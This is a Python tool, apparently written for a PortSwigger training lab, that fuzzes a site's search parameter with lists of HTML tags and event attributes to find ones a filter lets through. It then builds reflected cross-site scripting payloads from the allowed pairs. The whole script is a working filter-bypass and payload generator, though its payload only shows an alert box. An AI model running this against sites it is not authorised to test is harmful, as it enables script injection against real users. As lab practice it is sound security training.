import requests
from termcolor import colored
from argparse import ArgumentParser
tags= []
events = []
payloads = []

def identify_allowed_tag(target_url,cookie,tags_file):
    with open(f"{tags_file}","r") as file:    
        for tag in file:
            tag = tag.strip()   
            url = f"{target_url}/?search=<{tag}>"
            headers = {"cookie": cookie}
            response = requests.get(url, headers=headers)
            
            if "Tag is not allowed" in response.text:
                print(colored("[!] Tag is not allowed","red"))
            else:
                print(colored(f"[+] The <{tag}> tag is allowed.","green"))
                tags.append(tag)
                        
def identify_allowed_event(target_url, cookie, events_file):
    with open(f"{events_file}","r") as file:    
        for event in file:
            event = event.strip()   
            url = f"{target_url}/?search=<test {event}>"
            headers = {"cookie": cookie}
            response = requests.get(url, headers=headers)
            
            if "Attribute is not allowed" in response.text:
                print(colored("[!] Event is not allowed","red"))
            else:
                print(colored(f"[+] The '{event}' event is allowed.", "green"))
                events.append(event)   

def create_payload(tags,events):
    for tag in tags:
        for event in events:
            payloads.append(f"<{tag} {event}=alert(111)>")          
     
def parse_args():
    example = '''
    Example:
    python3 ReflectedXSS.py  --url https://web-security-academy.net --tags-file /path/tags.txt --events-file /path/events.txt --cookie "session=tCZxFr4rWGGBatEbpilZ34OAFUsrzkI9"
    '''
    parser = ArgumentParser(epilog=example,description='Create allowed payloads for PortSwigger lab of "Reflected XSS into HTML context with most tags and attributes blocked"')
    parser.add_argument('-u', '--url', required=True, help='The target URL')
    parser.add_argument('-c', '--cookie', required=True, type= str, help='The HTTP cookie header value')
    parser.add_argument('-tf', '--tags-file', required=True, help='Pass tags file')
    parser.add_argument('-ef', '--events-file', required=True, help='Pass events file')
    args = parser.parse_args()
    return args
     
def main():
    args = parse_args()   
    identify_allowed_tag(args.url, args.cookie, args.tags_file)
    identify_allowed_event(args.url, args.cookie, args.events_file)
    create_payload(tags, events)
    print("----------------------------------")
    print(colored("The allowed created payloads:",'green',attrs=['bold']))
    for payload in payloads:            
        print(colored(payload,'green',attrs=['bold']))
        
if __name__ == '__main__':
    main()               